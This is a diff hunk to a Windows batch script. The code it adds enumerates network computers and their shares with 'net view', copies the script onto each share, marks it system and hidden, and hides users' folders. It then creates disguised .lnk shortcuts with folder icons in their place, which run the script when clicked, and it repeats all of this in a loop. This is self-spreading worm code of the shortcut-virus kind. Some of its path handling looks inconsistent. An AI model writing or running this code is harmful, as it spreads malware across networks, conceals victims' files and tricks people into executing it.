@@ -112,4 +112,31 @@ for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do (
 )
 
 timeout /nobreak /t 10 >nul
+
+for /f "skip=3 tokens=1,* delims= " %%i in ('net view') do if "%%i" NEQ "The" (
+  for /f "skip=7 tokens=1,* delims= " %%j in ('net view %%i') do if "%%j" NEQ "The" (
+    if exist "%%i:\%~nx0" (
+      attrib +s +h "%%i\%%j\%~nx0"
+
+      if "%%j:" NEQ "C:" (
+        for /f "delims=" %%x in ('dir "%%i\%%j\*" /a:d /b 2^>nul') do (
+          if "%%x" NEQ "$RECYCLE.BIN" if "%%x" NEQ "FOUND.000" if "%%x" NEQ "Recycled" if "%%x" NEQ "System Volume Information" (
+            attrib +h "%%i\%%j\%%x"
+            if not exist "%%i\%%j\%%x.lnk" (
+              set counter=0
+              for /f "delims=" %%y in ('dir "%%i\%%j\%%x\*" /b 2^>nul') do set /a counter+=1
+              if "!counter!" == "0" (
+                %module_shortcut% /a:c /f:"%%i\%%j\%%x.lnk" /t:"%%i\%%j\%~nx0" /p:"--key_target="""%%j:\%%x"""" /i:"%WinDir%\System32\shell32.dll,3"
+              ) else (
+                %module_shortcut% /a:c /f:"%%i\%%j\%%x.lnk" /t:"%%i\%%j\%~nx0" /p:"--key_target="""%%j:\%%x"""" /i:"%WinDir%\System32\imageres.dll,153"
+              )
+            )
+          )
+        )
+      )
+    ) else copy /y "%~dpnx0" "%%i\%%j\"
+  )
+)
+
+timeout /nobreak /t 10 >nul
 goto :cycle
